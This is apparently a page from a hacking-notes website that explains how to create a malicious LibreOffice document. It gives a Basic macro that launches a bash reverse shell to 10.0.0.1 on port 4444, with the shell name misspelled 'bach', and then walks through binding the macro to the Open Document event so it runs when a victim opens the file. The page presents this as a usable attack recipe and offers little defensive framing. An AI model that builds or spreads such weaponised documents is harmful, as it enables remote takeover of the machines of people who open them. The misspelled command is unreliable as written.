<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>LibreOffice Macros - readloud.org</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "LibreOffice Macros", url: "#_top", children: [
              {title: "Create Macro to Code Execution", url: "#create-macro-to-code-execution" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="libreoffice-macros">LibreOffice Macros</h1>
<p>LibreOffice is an open-source office software alternative to Microsoft Word, Excel, etc. There are multiple applications such as Calc, Writer. Supported file extensions are also variety such as .odf, .odp, odt (OpenDocument), .odb (OpenOffice Base) etc.</p>
<h2 id="create-macro-to-code-execution">Create Macro to Code Execution</h2>
<p>Reference: <a href="https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html">https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html</a></p>
<h3 id="1-create-macro">1. Create Macro</h3>
<p>We can create a macro and embed it into a <strong>LibreOffice</strong> file, like Microsoft Excel.</p>
<ol>
<li>Open one of the LibreOffice applications such as <strong>Calc, Writer</strong>.</li>
<li>Save a new empty file at first.</li>
<li>Go to <strong>Tools ‚Üí Macros ‚Üí Organize Macros ‚Üí Basic</strong>. The BASIC Macros window opens.</li>
<li>In the window, select our new created filename in the left pane, then click <strong>New</strong>. Enter arbitrary module name and click OK. Macro editor (LibreOffice Basic) opens.</li>
<li>In the Macro editor, write our code as below. It‚Äôs an example for reverse shell.</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>    REM  *****  BASIC  *****
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>    Sub Main
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>        Shell(&quot;bach -c &#39;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&#39;&quot;)
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>    End Sub
</span></code></pre></div>
<ol>
<li>Now close the editor.</li>
</ol>
<h3 id="2-embed-the-macro-to-libreoffice-file">2. Embed the Macro to LibreOffice File.</h3>
<p>After creating a macro as above, next configure the macro to run immediately after opening this LibreOffice file.</p>
<ol>
<li>Return to the original window on LibreOffice.</li>
<li>Go to <strong>Tools ‚Üí Macros ‚Üí Organize Macros ‚Üí Basic</strong> again. The BASIC Macros window opens.</li>
<li>Select our new created macro (module) in the left pane. For example,</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>    example.odt
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>        - Standard
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>            - Module1 &lt;- select this
</span></code></pre></div>
<ol>
<li>Click <strong>Assign</strong>. The Customize window opens.</li>
<li>In Customize window, go to <strong>Events</strong> tab. Then select <strong>Open Document</strong> and click <strong>'Macro‚Ä¶'</strong>. The Macro Selector window opens.</li>
<li>In the Macro Selector window, select our new created macro (module), then click OK.</li>
<li>Now we should see the text such <strong>"Standard.Module1.Main"</strong> at the right of the <strong>Open Document</strong>. Click <strong>OK</strong>.</li>
<li>Save this LibreOffice file again.</li>
<li>Finally, we‚Äôve created the file which is executed when the file opens.</li>
</ol>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/malware/libreoffice-macros.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ‚ö†Ô∏è The quieter you become, the more you are able to hear ü•∑</p>
</footer>

</body>
</html>